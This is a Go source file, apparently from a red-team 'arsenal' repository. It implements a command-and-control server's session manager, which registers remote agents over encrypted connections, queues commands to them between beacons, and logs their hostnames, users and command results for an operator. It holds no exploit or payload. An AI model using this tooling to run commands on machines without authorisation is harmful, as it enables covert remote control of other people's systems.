// Package session implements the persistent session graph and task queue
// that hold live agents between beacon intervals.
package session

import (
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/crypto"
	"github.com/sk666G/red-sky---arsenal/internal/proto"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
)

// TaskState is the lifecycle stage of a task.
type TaskState string

const (
	TaskQueued  TaskState = "queued"
	TaskSent    TaskState = "sent"
	TaskDone    TaskState = "done"
	TaskFailed  TaskState = "failed"
	TaskTimeout TaskState = "timeout"
)

// Task is a command with tracked state.
type Task struct {
	ID        string
	Cmd       string
	Args      []string
	Timeout   int
	State     TaskState
	Result    *proto.Result
	Enqueued  time.Time
	Completed time.Time
	Error     string
}

// Session is one live agent.
type Session struct {
	AgentID  string
	Info     proto.AgentInfo
	Joined   time.Time
	LastSeen time.Time

	conn   net.Conn
	crypto *crypto.Session
	write  chan *Task
	tasks  map[string]*Task // keyed by task ID
	mu     sync.Mutex
	closed bool
}

// Send enqueues a task for the agent.
func (s *Session) Send(cmd string, args []string, timeout int) *Task {
	id := fmt.Sprintf("t-%d", time.Now().UnixNano())
	t := &Task{
		ID:       id,
		Cmd:      cmd,
		Args:     args,
		Timeout:  timeout,
		State:    TaskQueued,
		Enqueued: time.Now(),
	}
	s.mu.Lock()
	s.tasks[id] = t
	s.mu.Unlock()
	s.write <- t
	return t
}

// Tasks returns a snapshot of the task list in order of enqueue.
func (s *Session) Tasks() []*Task {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]*Task, 0, len(s.tasks))
	for _, t := range s.tasks {
		out = append(out, t)
	}
	// sort by enqueued
	for i := 0; i < len(out); i++ {
		for j := i + 1; j < len(out); j++ {
			if out[j].Enqueued.Before(out[i].Enqueued) {
				out[i], out[j] = out[j], out[i]
			}
		}
	}
	return out
}

// --- Manager ---

// Manager tracks all live sessions.
type Manager struct {
	sessions map[string]*Session
	mu       sync.RWMutex
	Events   chan Event
}

// Event is something worth showing the operator.
type Event struct {
	TS      time.Time
	Kind    string // "beacon", "result", "error", "connect", "disconnect"
	AgentID string
	Text    string
}

// NewManager creates an empty manager.
func NewManager() *Manager {
	return &Manager{
		sessions: make(map[string]*Session),
		Events:   make(chan Event, 256),
	}
}

// Sessions returns a snapshot of live sessions.
func (m *Manager) Sessions() []*Session {
	m.mu.RLock()
	defer m.mu.RUnlock()
	out := make([]*Session, 0, len(m.sessions))
	for _, s := range m.sessions {
		out = append(out, s)
	}
	return out
}

// Get returns a session by ID.
func (m *Manager) Get(id string) (*Session, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	s, ok := m.sessions[id]
	return s, ok
}

// Register adds a session after TLS + ECDH completes. It spawns the reader
// and writer goroutines for that session.
func (m *Manager) Register(agentID string, info proto.AgentInfo, conn net.Conn, cs *crypto.Session) *Session {
	s := &Session{
		AgentID:  agentID,
		Info:     info,
		Joined:   time.Now(),
		LastSeen: time.Now(),
		conn:     conn,
		crypto:   cs,
		write:    make(chan *Task, 64),
		tasks:    make(map[string]*Task),
	}
	m.mu.Lock()
	// If an old session with the same agent ID exists, close it.
	if old, ok := m.sessions[agentID]; ok {
		old.close()
	}
	m.sessions[agentID] = s
	m.mu.Unlock()

	m.emit("connect", agentID, fmt.Sprintf("agent %s connected from %s", agentID, conn.RemoteAddr()))

	go m.readerLoop(s)
	go m.writerLoop(s)
	return s
}

func (m *Manager) emit(kind, agentID, text string) {
	select {
	case m.Events <- Event{TS: time.Now(), Kind: kind, AgentID: agentID, Text: text}:
	default:
	}
}

func (s *Session) close() {
	s.mu.Lock()
	if s.closed {
		s.mu.Unlock()
		return
	}
	s.closed = true
	s.mu.Unlock()
	_ = s.conn.Close()
}

// writerLoop pulls tasks off s.write and sends them encrypted.
func (m *Manager) writerLoop(s *Session) {
	for t := range s.write {
		payload, err := json.Marshal(proto.Task{
			ID: t.ID, Cmd: t.Cmd, Args: t.Args, Timeout: t.Timeout,
		})
		if err != nil {
			m.emit("error", s.AgentID, "marshal task: "+err.Error())
			continue
		}
		env := proto.Envelope{Type: proto.TypeTask, Payload: payload}
		envBytes, _ := json.Marshal(env)
		enc, err := s.crypto.Encrypt(envBytes)
		if err != nil {
			m.emit("error", s.AgentID, "encrypt task: "+err.Error())
			continue
		}
		if err := wire.WriteFrame(s.conn, wire.FlagEncrypted, enc); err != nil {
			m.emit("error", s.AgentID, "send task: "+err.Error())
			s.close()
			return
		}
		s.mu.Lock()
		t.State = TaskSent
		s.mu.Unlock()
		m.emit("task", s.AgentID, "sent "+t.ID+": "+t.Cmd)
	}
}

// readerLoop continuously reads frames from the agent and routes them.
func (m *Manager) readerLoop(s *Session) {
	for {
		frame, err := wire.ReadFrame(s.conn)
		if err != nil {
			m.emit("disconnect", s.AgentID, "closed: "+err.Error())
			m.mu.Lock()
			delete(m.sessions, s.AgentID)
			m.mu.Unlock()
			return
		}
		if frame.Flags&wire.FlagEncrypted == 0 {
			m.emit("error", s.AgentID, "unexpected unencrypted frame")
			continue
		}
		plain, err := s.crypto.Decrypt(frame.Payload)
		if err != nil {
			m.emit("error", s.AgentID, "decrypt: "+err.Error())
			continue
		}
		var env proto.Envelope
		if err := json.Unmarshal(plain, &env); err != nil {
			m.emit("error", s.AgentID, "envelope: "+err.Error())
			continue
		}
		switch env.Type {
		case proto.TypeBeacon:
			var b proto.Beacon
			if err := json.Unmarshal(env.Payload, &b); err == nil {
				s.mu.Lock()
				s.Info = b.Info
				s.LastSeen = time.Now()
				s.mu.Unlock()
				m.emit("beacon", s.AgentID, b.Info.Hostname+" "+b.Info.User)
			}
		case proto.TypeResult:
			var r proto.Result
			if err := json.Unmarshal(env.Payload, &r); err == nil {
				s.mu.Lock()
				if t, ok := s.tasks[r.TaskID]; ok {
					t.Result = &r
					t.Completed = time.Now()
					if r.Error != "" {
						t.State = TaskFailed
						t.Error = r.Error
					} else {
						t.State = TaskDone
					}
				}
				s.mu.Unlock()
				m.emit("result", s.AgentID, fmt.Sprintf("%s rc=%d", r.TaskID, r.ExitCode))
			}
		case proto.TypeError:
			var e proto.ErrorReport
			if err := json.Unmarshal(env.Payload, &e); err == nil {
				m.emit("error", s.AgentID, e.Message)
			}
		default:
			m.emit("error", s.AgentID, "unknown message: "+string(env.Type))
		}
	}
}

// ErrNoSession is returned when a task is submitted to a dead session.
var ErrNoSession = errors.New("session: no such agent")
